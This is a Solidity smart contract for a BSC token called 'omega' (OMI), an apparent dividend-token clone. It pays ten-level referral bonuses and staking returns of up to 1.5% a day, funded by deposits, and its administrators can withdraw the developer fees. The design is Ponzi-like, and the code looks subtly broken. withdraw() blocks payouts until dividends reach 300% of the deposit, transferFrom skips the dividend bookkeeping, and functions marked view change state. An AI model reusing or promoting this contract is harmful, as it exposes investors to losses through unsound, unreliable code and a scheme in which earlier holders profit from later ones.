/**
 *Submitted for verification at BscScan.com on 2021-07-20
*/

pragma solidity ^0.4.26;

 /**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
    function percent(uint value,uint numerator, uint denominator, uint precision) internal pure  returns(uint quotient) {
        uint _numerator  = numerator * 10 ** (precision+1);
        uint _quotient =  ((_numerator / denominator) + 5) / 10;
        return (value*_quotient/1000000000000000000);
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract BEP20 {
 /*==============================
    =            EVENTS            =
    ==============================*/
    
    event onTokenPurchase(
        address indexed customerAddress,
        uint256 incomingEthereum,
        uint256 tokensMinted,
        address indexed referredBy
    );
    
    event onTokenSell(
        address indexed customerAddress,
        uint256 tokensBurned,
        uint256 ethereumEarned
    );
    
    event onReinvestment(
        address indexed customerAddress,
        uint256 ethereumReinvested,
        uint256 tokensMinted
    );
    
    event onWithdraw(
        address indexed customerAddress,
        uint256 ethereumWithdrawn
    );
    
    event Transfer(
        address indexed from,
        address indexed to,
        uint256 tokens
    );
	event Approval(
	address indexed owner, 
	address indexed spender,
	uint value
	);

	function totalSupply() public view returns (uint256);
	function allowance(address owner, address spender)public view returns (uint);
  function transferFrom(address from, address to, uint value)public returns (bool ok);
  function approve(address spender, uint value)public returns (bool ok);
  function transfer(address to, uint value)public returns (bool ok);
}

contract omega is BEP20 {
    
    /*=====================================
    =            CONFIGURABLES            =
    =====================================*/
    
    string public name                                      = "omega";
    string public symbol                                    = "OMI";
    uint8 constant public decimals                          = 18;
    uint8 constant internal dividendFee_                    = 5;
    uint8 constant internal referralPer_                    = 20;
    uint8 constant internal developerFee_                   = 5;
    uint256 internal stakePer_                              = 250000000000000000;
    uint256 constant internal tokenPriceInitial_            = 0.15 finney;
    uint256 constant internal tokenPriceIncremental_        = 0.0001 finney;
    uint256 constant internal tokenPriceDecremental_        = 0.00012 finney;
    uint256 constant internal magnitude                     = 2**64;
    
   
    uint256 public stakingRequirement                       = 1e18;
    
    // Ambassador program
    mapping(address => bool) internal ambassadors_;
    uint256 constant internal ambassadorMaxPurchase_        = 151.5 finney;
    uint256 constant internal ambassadorQuota_              = 151.5 finney;
    
   /*================================
    =            DATASETS            =
    ================================*/
    
    mapping(address => uint256) internal tokenBalanceLedger_;
    mapping(address => uint256) internal stakeBalanceLedger_;
    mapping(address => uint256) internal stakingTime_;
    mapping(address => uint256) internal referralBalance_;
	mapping(address => uint256) internal investBalanceLedger_;
	mapping(address => uint256) internal withdrawBalanceLedger_;
    
    mapping(address => address) internal referralLevel1Address;
    mapping(address => address) internal referralLevel2Address;
    mapping(address => address) internal referralLevel3Address;
    mapping(address => address) internal referralLevel4Address;
    mapping(address => address) internal referralLevel5Address;
    mapping(address => address) internal referralLevel6Address;
    mapping(address => address) internal referralLevel7Address;
    mapping(address => address) internal referralLevel8Address;
    mapping(address => address) internal referralLevel9Address;
    mapping(address => address) internal referralLevel10Address;
    
    mapping(address => int256) internal payoutsTo_;
    mapping(address => uint256) internal ambassadorAccumulatedQuota_;
    uint256 internal tokenSupply_                           = 0;
    uint256 internal developerBalance                       = 0;
    uint256 internal profitPerShare_;
    mapping (address => uint256) balances;
     mapping(address => mapping(address => uint)) allowed;
    
  
    mapping(bytes32 => bool) public administrators;
    bool public onlyAmbassadors = false;
    
    /*=================================
    =            MODIFIERS            =
    =================================*/
    
     // Only people with tokens
    modifier onlybelievers () {
        require(myTokens() > 0);
        _;
    }
    
    // Only people with profits
    modifier onlyhodler() {
        require(myDividends(true) > 0);
        _;
    }
    
    // Only admin
    modifier onlyAdministrator(){
        address _customerAddress = msg.sender;
        require(administrators[keccak256(_customerAddress)]);
        _;
    }
    
    modifier antiEarlyWhale(uint256 _amountOfEthereum){
        address _customerAddress = msg.sender;
        if( onlyAmbassadors && ((totalEthereumBalance() - _amountOfEthereum) <= ambassadorQuota_ )){
            require(
                // is the customer in the ambassador list?
                ambassadors_[_customerAddress] == true &&
                // does the customer purchase exceed the max ambassador quota?
                (ambassadorAccumulatedQuota_[_customerAddress] + _amountOfEthereum) <= ambassadorMaxPurchase_
            );
            // updated the accumulated quota    
            ambassadorAccumulatedQuota_[_customerAddress] = SafeMath.add(ambassadorAccumulatedQuota_[_customerAddress], _amountOfEthereum);
            _;
        } else {
            // in case the ether count drops low, the ambassador phase won't reinitiate
            onlyAmbassadors = false;
            _;    
        }
    }
    
   

    /*=======================================
    =            PUBLIC FUNCTIONS            =
    =======================================*/
    /*
    * -- APPLICATION ENTRY POINTS --  
    */
    function omega() public {
        // add administrators here
        administrators[0x28ff2657d0617f53daa1b95ac9fbf3ff3fb7a1b42eb29cd124edd9394099c581] = true;
        ambassadors_[0x0000000000000000000000000000000000000000] = true;
    }
     
    /**
     * BUY
     */
    function buy(address _referredBy) payable public {
		investBalanceLedger_[msg.sender] = msg.value;
        purchaseTokens(msg.value, _referredBy);
		
    }
    
    function() payable public {
        purchaseTokens(msg.value, 0x0);
    }
    
    /**
     * REINVEST
     */
    function reinvest() onlyhodler() public {
        
        uint256 _dividends                  = myDividends(false); // retrieve ref. bonus later in the code
        
        address _customerAddress            = msg.sender;
        payoutsTo_[_customerAddress]        +=  (int256) (_dividends * magnitude);
        
        _dividends                          += referralBalance_[_customerAddress];
        referralBalance_[_customerAddress]  = 0;
        
        uint256 _tokens                     = purchaseTokens(_dividends, 0x0);
        // fire event
        onReinvestment(_customerAddress, _dividends, _tokens);
    }
    
    /**
     * EXIT
     */
    function exit() public {
        
        address _customerAddress            = msg.sender;
        uint256 _tokens                     = tokenBalanceLedger_[_customerAddress];
        if(_tokens > 0) sell(_tokens);
        withdraw();
    }

    /**
     * WITHDRAW
     */
    function withdraw() onlyhodler() public {
        
		
        address _customerAddress            = msg.sender;
		
		
		
        uint256 _dividends                  = myDividends(false); // get ref. bonus later in the code
        
        payoutsTo_[_customerAddress]        +=  (int256) (_dividends * magnitude);
        
        _dividends                          += referralBalance_[_customerAddress];
        referralBalance_[_customerAddress]  = 0;
        
        uint256 totalwitdraw = SafeMath.percent(SafeMath.add(investBalanceLedger_[_customerAddress],withdrawBalanceLedger_[_customerAddress]),300,100,18);
        require( totalwitdraw <= _dividends);
		
        withdrawBalanceLedger_[_customerAddress] = _dividends;
		
		_customerAddress.transfer(_dividends);
		
        // fire event
        onWithdraw(_customerAddress, _dividends);
    }
    
    /**
     * SELL
     */
    function sell(uint256 _amountOfTokens) onlybelievers () public {
        address _customerAddress            = msg.sender;
        require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
        uint256 _tokens                     = _amountOfTokens;
        uint256 _ethereum                   = tokensToEthereum_(_tokens);
        uint256 _dividends                  = myDividends(false);
        uint256 _taxedEthereum              = _ethereum;
        
        tokenSupply_                        = SafeMath.sub(tokenSupply_, _tokens);
        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);
        
        int256 _updatedPayouts              = (int256) (profitPerShare_ * _tokens + (_taxedEthereum * magnitude));
        payoutsTo_[_customerAddress]        -= _updatedPayouts;       
        
        if (tokenSupply_ > 0) {
        
            profitPerShare_                 = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);
        }
        
        onTokenSell(_customerAddress, _tokens, _taxedEthereum);
    }
    
    /**
     * TRANSFER
     */
    function transfer(address _toAddress, uint256 _amountOfTokens) onlybelievers () public returns(bool) {
        address _customerAddress            = msg.sender;
        
        require(!onlyAmbassadors && _amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
        
        if(myDividends(true) > 0) withdraw();
       
       
        uint256 _taxedTokens                = _amountOfTokens;
        uint256 _dividends                  = myDividends(false);
        
        tokenSupply_                        = tokenSupply_;
        
        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
        tokenBalanceLedger_[_toAddress]     = SafeMath.add(tokenBalanceLedger_[_toAddress], _taxedTokens);
       
        payoutsTo_[_customerAddress]        -= (int256) (profitPerShare_ * _amountOfTokens);
        payoutsTo_[_toAddress]              += (int256) (profitPerShare_ * _taxedTokens);
       
        profitPerShare_                     = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);
       
        Transfer(_customerAddress, _toAddress, _taxedTokens);
        return true;
    }
    
    /*----------  ADMINISTRATOR ONLY FUNCTIONS  ----------*/
    
    function disableInitialStage() onlyAdministrator() public {
        onlyAmbassadors                     = false;
    }
    
    /*function changeStakePercent(uint8 stakePercent) onlyAdministrator() public {
        stakePer_                           = stakePercent;
    }*/
	
	function getstakePercentage() public view returns(uint256) {
		uint256 contractbal = totalEthereumBalance();
		if(contractbal <= (0.25 * 1e18) )										    stakePer_ = 250000000000000000;
		else if (contractbal > (0.25 * 1e18) && contractbal <= (0.50 * 1e18) ) 		stakePer_ = 500000000000000000;
		else if (contractbal > (0.50 * 1e18) && contractbal <= (1 * 1e18) ) 		stakePer_ = 750000000000000000;
		else if (contractbal > (1 * 1e18) && contractbal <= (5 * 1e18) ) 	        stakePer_ = 1000000000000000000;
		else if (contractbal > (5 * 1e18) && contractbal <= (20 * 1e18) ) 	        stakePer_ = 1250000000000000000;
		else																        stakePer_ = 1500000000000000000;
		
		return stakePer_;
	}
    
    function setAdministrator(bytes32 _identifier, bool _status) onlyAdministrator() public {
        administrators[_identifier]         = _status;
    }
    
    function setStakingRequirement(uint256 _amountOfTokens) onlyAdministrator() public {
        stakingRequirement                  = _amountOfTokens;
    }
    
    function setName(string _name) onlyAdministrator() public {
        name                                = _name;
    }
    
    function setSymbol(string _symbol) onlyAdministrator() public {
        symbol                              = _symbol;
    }
    
      
    function withdrawDeveloperFees() external onlyAdministrator {
        address _adminAddress   = msg.sender;
        _adminAddress.transfer(developerBalance);
        developerBalance        = 0;
    }
    
    /*---------- CALCULATORS  ----------*/
    
    function totalEthereumBalance() public view returns(uint) {
        return this.balance;
    }
   
    function totalDeveloperBalance() public view returns(uint) {
        return developerBalance;
    }
    
    function totalSupply() public view returns(uint256) {
        return tokenSupply_;
    }
    
    
    function myTokens() public view returns(uint256) {
        address _customerAddress            = msg.sender;
        return balanceOf(_customerAddress);
    }
    
    
    function myDividends(bool _includeReferralBonus) public view returns(uint256) {
        address _customerAddress            = msg.sender;
        return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;
    }
    
   
    function balanceOf(address _customerAddress) view public returns(uint256) {
        return tokenBalanceLedger_[_customerAddress];
    }
    
    
    function dividendsOf(address _customerAddress) view public returns(uint256) {
        return (uint256) ((int256)(profitPerShare_ * (tokenBalanceLedger_[_customerAddress] + stakeBalanceLedger_[_customerAddress])) - payoutsTo_[_customerAddress]) / magnitude;
    }
    
	 function transferFrom( address _from, address _to, uint256 _amount ) public returns (bool success) {
        require( _to != 0x0);
        require(tokenBalanceLedger_[_from] >= _amount && allowed[_from][msg.sender] >= _amount && _amount >= 0);
        tokenBalanceLedger_[_from] = SafeMath.sub(tokenBalanceLedger_[_from],_amount);
        allowed[_from][msg.sender] = SafeMath.sub(allowed[_from][msg.sender],_amount);
        tokenBalanceLedger_[_to] = SafeMath.add(tokenBalanceLedger_[_to],_amount);
        Transfer(_from, _to, _amount);
        return true;
    }
    
    // Allow _spender to withdraw from your account, multiple times, up to the _value amount.
    // If this function is called again it overwrites the current allowance with _value.
    function approve(address _spender, uint256 _amount) public returns (bool success) {
        require( _spender != 0x0);
        allowed[msg.sender][_spender] = _amount;
        Approval(msg.sender, _spender, _amount);
        return true;
    }
  
    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        require( _owner != 0x0 && _spender !=0x0);
        return allowed[_owner][_spender];
    }
	
	
	
	
   
    function sellPrice() public view returns(uint256) {
        if(tokenSupply_ == 0){
            return tokenPriceInitial_       - tokenPriceDecremental_;
        } else {
            uint256 _ethereum               = tokensToEthereum_(1e18);
            uint256 _taxedEthereum          = _ethereum;
            return _taxedEthereum;
        }
    }
    
   
    function buyPrice() public view returns(uint256) {
        if(tokenSupply_ == 0){
            return tokenPriceInitial_       + tokenPriceIncremental_;
        } else {
            uint256 _ethereum               = tokensToEthereum_(1e18);
            uint256 untotalDeduct           = developerFee_ + referralPer_ + dividendFee_;
            uint256 totalDeduct             = SafeMath.percent(_ethereum,untotalDeduct,100,18);
            uint256 _taxedEthereum          = SafeMath.add(_ethereum, totalDeduct);
            return _taxedEthereum;
        }
    }
   
    function calculateTokensReceived(uint256 _ethereumToSpend) public view returns(uint256) {
        uint256 untotalDeduct               = developerFee_ + referralPer_ + dividendFee_;
        uint256 totalDeduct                 = SafeMath.percent(_ethereumToSpend,untotalDeduct,100,18);
        uint256 _taxedEthereum              = SafeMath.sub(_ethereumToSpend, totalDeduct);
        uint256 _amountOfTokens             = ethereumToTokens_(_taxedEthereum);
        return _amountOfTokens;
    }
   
    function calculateEthereumReceived(uint256 _tokensToSell) public view returns(uint256) {
        require(_tokensToSell <= tokenSupply_);
        uint256 _ethereum                   = tokensToEthereum_(_tokensToSell);
        uint256 _taxedEthereum              = _ethereum;
        return _taxedEthereum;
    }
    
    function stakeTokens(uint256 _amountOfTokens) onlybelievers () public returns(bool){
        address _customerAddress            = msg.sender;
      
        require(!onlyAmbassadors && _amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
        uint256 _amountOfTokensWith1Token   = SafeMath.sub(_amountOfTokens, 1e18);
        stakingTime_[_customerAddress]      = now;
        stakeBalanceLedger_[_customerAddress] = SafeMath.add(stakeBalanceLedger_[_customerAddress], _amountOfTokensWith1Token);
        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokensWith1Token);
    }
    
    
    function stakeTokensBalance(address _customerAddress) public view returns(uint256){
		stakePer_ = getstakePercentage();
        uint256 timediff                    = SafeMath.sub(now, stakingTime_[_customerAddress]);
        uint256 dayscount                   = SafeMath.div(timediff, 86400); //86400 Sec for 1 Day
        uint256 roiPercent                  = SafeMath.mul(dayscount, stakePer_);
        uint256 roiTokens                   = SafeMath.percent(stakeBalanceLedger_[_customerAddress],roiPercent,100,18);
        uint256 finalBalance                = SafeMath.add(stakeBalanceLedger_[_customerAddress],roiTokens/1e18);
        return finalBalance;
    }
    
    function stakeTokensTime(address _customerAddress) public view returns(uint256){
        return stakingTime_[_customerAddress];
    }
    
    function releaseStake() onlybelievers () public returns(bool){
        address _customerAddress            = msg.sender;
    
        require(!onlyAmbassadors && stakingTime_[_customerAddress] > 0);
		stakePer_ = getstakePercentage();
        uint256 _amountOfTokens             = stakeBalanceLedger_[_customerAddress];
        uint256 timediff                    = SafeMath.sub(now, stakingTime_[_customerAddress]);
        uint256 dayscount                   = SafeMath.div(timediff, 86400);
        uint256 roiPercent                  = SafeMath.mul(dayscount, stakePer_);
        uint256 roiTokens                   = SafeMath.percent(_amountOfTokens,roiPercent,100,18);
		uint256 finalBalance                = SafeMath.add(_amountOfTokens,roiTokens/1e18);
        
    
        tokenSupply_                        = SafeMath.add(tokenSupply_, roiTokens/1e18);
    
        tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], finalBalance);
        stakeBalanceLedger_[_customerAddress] = 0;
        stakingTime_[_customerAddress]      = 0;
        
    }
    
    /*==========================================
    =            INTERNAL FUNCTIONS            =
    ==========================================*/
    
    uint256 developerFee;
    uint256 incETH;
    address _refAddress; 
    uint256 _referralBonus;
    
    uint256 bonusLv1;
    uint256 bonusLv2;
    uint256 bonusLv3;
    uint256 bonusLv4;
    uint256 bonusLv5;
    uint256 bonusLv6;
    uint256 bonusLv7;
    uint256 bonusLv8;
    uint256 bonusLv9;
    uint256 bonusLv10;
    
    address chkLv2;
    address chkLv3;
    address chkLv4;
    address chkLv5;
    address chkLv6;
    address chkLv7;
    address chkLv8;
    address chkLv9;
    address chkLv10;
    
    struct RefUserDetail {
        address refUserAddress;
        uint256 refLevel;
    }

    mapping(address => mapping (uint => RefUserDetail)) public RefUser;
    mapping(address => uint256) public referralCount_;
    
    function getDownlineRef(address senderAddress, uint dataId) external view returns (address,uint) { 
        return (RefUser[senderAddress][dataId].refUserAddress,RefUser[senderAddress][dataId].refLevel);
    }
    
    function addDownlineRef(address senderAddress, address refUserAddress, uint refLevel) internal {
        referralCount_[senderAddress]++;
        uint dataId = referralCount_[senderAddress];
        RefUser[senderAddress][dataId].refUserAddress = refUserAddress;
        RefUser[senderAddress][dataId].refLevel = refLevel;
    }

    function getref(address _customerAddress, uint _level) public view returns(address lv) {
        if(_level == 1) {
            lv = referralLevel1Address[_customerAddress];
        } else if(_level == 2) {
            lv = referralLevel2Address[_customerAddress];
        } else if(_level == 3) {
            lv = referralLevel3Address[_customerAddress];
        } else if(_level == 4) {
            lv = referralLevel4Address[_customerAddress];
        } else if(_level == 5) {
            lv = referralLevel5Address[_customerAddress];
        } else if(_level == 6) {
            lv = referralLevel6Address[_customerAddress];
        } else if(_level == 7) {
            lv = referralLevel7Address[_customerAddress];
        } else if(_level == 8) {
            lv = referralLevel8Address[_customerAddress];
        } else if(_level == 9) {
            lv = referralLevel9Address[_customerAddress];
        } else if(_level == 10) {
            lv = referralLevel10Address[_customerAddress];
        } 
        return lv;
    }
    
    function distributeRefBonus(uint256 _incomingEthereum, address _referredBy, address _sender, bool _newReferral) internal {
        address _customerAddress        = _sender;
        uint256 remainingRefBonus       = _incomingEthereum;
        _referralBonus                  = _incomingEthereum;
        
        bonusLv1                        = SafeMath.percent(_referralBonus,35,100,18);
        bonusLv2                        = SafeMath.percent(_referralBonus,25,100,18);
        bonusLv3                        = SafeMath.percent(_referralBonus,10,100,18);
        bonusLv4                        = SafeMath.percent(_referralBonus,5,100,18);
        bonusLv5                        = SafeMath.percent(_referralBonus,3,100,18);
        bonusLv6                        = SafeMath.percent(_referralBonus,2,100,18);
        bonusLv7                        = SafeMath.percent(_referralBonus,2,100,18);
        bonusLv8                        = SafeMath.percent(_referralBonus,2,100,18);
        bonusLv9                        = SafeMath.percent(_referralBonus,1,100,18);
        bonusLv10                       = SafeMath.percent(_referralBonus,1,100,18);
        
      
        referralLevel1Address[_customerAddress]                     = _referredBy;
        referralBalance_[referralLevel1Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel1Address[_customerAddress]], bonusLv1);
        remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv1);
        if(_newReferral == true) {
            addDownlineRef(_referredBy, _customerAddress, 1);
        }
        
        chkLv2                          = referralLevel1Address[_referredBy];
        chkLv3                          = referralLevel2Address[_referredBy];
        chkLv4                          = referralLevel3Address[_referredBy];
        chkLv5                          = referralLevel4Address[_referredBy];
        chkLv6                          = referralLevel5Address[_referredBy];
        chkLv7                          = referralLevel6Address[_referredBy];
        chkLv8                          = referralLevel7Address[_referredBy];
        chkLv9                          = referralLevel8Address[_referredBy];
        chkLv10                         = referralLevel9Address[_referredBy];
        
      
        if(chkLv2 != 0x0000000000000000000000000000000000000000) {
            referralLevel2Address[_customerAddress]                     = referralLevel1Address[_referredBy];
            referralBalance_[referralLevel2Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel2Address[_customerAddress]], bonusLv2);
            remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv2);
            if(_newReferral == true) {
                addDownlineRef(referralLevel1Address[_referredBy], _customerAddress, 2);
            }
        }
        
      
        if(chkLv3 != 0x0000000000000000000000000000000000000000) {
            referralLevel3Address[_customerAddress]                     = referralLevel2Address[_referredBy];
            referralBalance_[referralLevel3Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel3Address[_customerAddress]], bonusLv3);
            remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv3);
            if(_newReferral == true) {
                addDownlineRef(referralLevel2Address[_referredBy], _customerAddress, 3);
            }
        }
        
      
        if(chkLv4 != 0x0000000000000000000000000000000000000000) {
            referralLevel4Address[_customerAddress]                     = referralLevel3Address[_referredBy];
            referralBalance_[referralLevel4Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel4Address[_customerAddress]], bonusLv4);
            remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv4);
            if(_newReferral == true) {
                addDownlineRef(referralLevel3Address[_referredBy], _customerAddress, 4);
            }
        }
        
      
        if(chkLv5 != 0x0000000000000000000000000000000000000000) {
            referralLevel5Address[_customerAddress]                     = referralLevel4Address[_referredBy];
            referralBalance_[referralLevel5Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel5Address[_customerAddress]], bonusLv5);
            remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv5);
            if(_newReferral == true) {
                addDownlineRef(referralLevel4Address[_referredBy], _customerAddress, 5);
            }
        }
        
      
        if(chkLv6 != 0x0000000000000000000000000000000000000000) {
            referralLevel6Address[_customerAddress]                     = referralLevel5Address[_referredBy];
            referralBalance_[referralLevel6Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel6Address[_customerAddress]], bonusLv6);
            remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv6);
            if(_newReferral == true) {
                addDownlineRef(referralLevel5Address[_referredBy], _customerAddress, 6);
            }
        }
        
        
        if(chkLv7 != 0x0000000000000000000000000000000000000000) {
            referralLevel7Address[_customerAddress]                     = referralLevel6Address[_referredBy];
            referralBalance_[referralLevel7Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel7Address[_customerAddress]], bonusLv7);
            remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv7);
            if(_newReferral == true) {
                addDownlineRef(referralLevel6Address[_referredBy], _customerAddress, 7);
            }
        }
        
        
        if(chkLv8 != 0x0000000000000000000000000000000000000000) {
            referralLevel8Address[_customerAddress]                     = referralLevel7Address[_referredBy];
            referralBalance_[referralLevel8Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel8Address[_customerAddress]], bonusLv8);
            remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv8);
            if(_newReferral == true) {
                addDownlineRef(referralLevel7Address[_referredBy], _customerAddress, 8);
            }
        }
        
        
        if(chkLv9 != 0x0000000000000000000000000000000000000000) {
            referralLevel9Address[_customerAddress]                     = referralLevel8Address[_referredBy];
            referralBalance_[referralLevel9Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel9Address[_customerAddress]], bonusLv9);
            remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv9);
            if(_newReferral == true) {
                addDownlineRef(referralLevel8Address[_referredBy], _customerAddress, 9);
            }
        }
        
       
        if(chkLv10 != 0x0000000000000000000000000000000000000000) {
            referralLevel10Address[_customerAddress]                    = referralLevel9Address[_referredBy];
            referralBalance_[referralLevel10Address[_customerAddress]]  = SafeMath.add(referralBalance_[referralLevel10Address[_customerAddress]], bonusLv10);
            remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv10);
            if(_newReferral == true) {
                addDownlineRef(referralLevel9Address[_referredBy], _customerAddress, 10);
            }
        }
        
        developerBalance                    = SafeMath.add(developerBalance, remainingRefBonus);
    }

    function purchaseTokens(uint256 _incomingEthereum, address _referredBy) antiEarlyWhale(_incomingEthereum) internal returns(uint256) {
        
        address _customerAddress            = msg.sender;
        incETH                              = _incomingEthereum;
       
        developerFee                        = SafeMath.percent(incETH,developerFee_,100,18);
        developerBalance                    = SafeMath.add(developerBalance, developerFee);
        
        _referralBonus                      = SafeMath.percent(incETH,referralPer_,100,18);
        
        uint256 _dividends                  = SafeMath.percent(incETH,dividendFee_,100,18);
        
        uint256 untotalDeduct               = developerFee_ + referralPer_ + dividendFee_;
        uint256 totalDeduct                 = SafeMath.percent(incETH,untotalDeduct,100,18);
        
        uint256 _taxedEthereum              = SafeMath.sub(incETH, totalDeduct);
        uint256 _amountOfTokens             = ethereumToTokens_(_taxedEthereum);
        uint256 _fee                        = _dividends * magnitude;
        bool    _newReferral                = true;
        if(referralLevel1Address[_customerAddress] != 0x0000000000000000000000000000000000000000) {
            _referredBy                     = referralLevel1Address[_customerAddress];
            _newReferral                    = false;
        }
        
        require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_));
        
        if(
           
            _referredBy != 0x0000000000000000000000000000000000000000 &&
           
            _referredBy != _customerAddress &&
            tokenBalanceLedger_[_referredBy] >= stakingRequirement
        ){
            
            distributeRefBonus(_referralBonus,_referredBy,_customerAddress,_newReferral);
        } else {
           
            developerBalance                = SafeMath.add(developerBalance, _referralBonus);
        }
       
        if(tokenSupply_ > 0){
           
            tokenSupply_                    = SafeMath.add(tokenSupply_, _amountOfTokens);
           
            profitPerShare_                 += (_dividends * magnitude / (tokenSupply_));
            
            _fee                            = _fee - (_fee-(_amountOfTokens * (_dividends * magnitude / (tokenSupply_))));
        } else {
            
            tokenSupply_                    = _amountOfTokens;
        }
        
        tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
        int256 _updatedPayouts              = (int256) ((profitPerShare_ * _amountOfTokens) - _fee);
        payoutsTo_[_customerAddress]        += _updatedPayouts;
       
        onTokenPurchase(_customerAddress, incETH, _amountOfTokens, _referredBy);
        return _amountOfTokens;
    }

   
    function ethereumToTokens_(uint256 _ethereum) internal view returns(uint256) {
        uint256 _tokenPriceInitial          = tokenPriceInitial_ * 1e18;
        uint256 _tokensReceived             = 
         (
            (
                SafeMath.sub(
                    (sqrt
                        (
                            (_tokenPriceInitial**2)
                            +
                            (2*(tokenPriceIncremental_ * 1e18)*(_ethereum * 1e18))
                            +
                            (((tokenPriceIncremental_)**2)*(tokenSupply_**2))
                            +
                            (2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_)
                        )
                    ), _tokenPriceInitial
                )
            )/(tokenPriceIncremental_)
        )-(tokenSupply_)
        ;

        return _tokensReceived;
    }
    
    
     function tokensToEthereum_(uint256 _tokens) internal view returns(uint256) {
        uint256 tokens_                     = (_tokens + 1e18);
        uint256 _tokenSupply                = (tokenSupply_ + 1e18);
        uint256 _etherReceived              =
        (
            SafeMath.sub(
                (
                    (
                        (
                            tokenPriceInitial_ +(tokenPriceDecremental_ * (_tokenSupply/1e18))
                        )-tokenPriceDecremental_
                    )*(tokens_ - 1e18)
                ),(tokenPriceDecremental_*((tokens_**2-tokens_)/1e18))/2
            )
        /1e18);
        return _etherReceived;
    }
    
    function sqrt(uint x) internal pure returns (uint y) {
        uint z = (x + 1) / 2;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }
    
}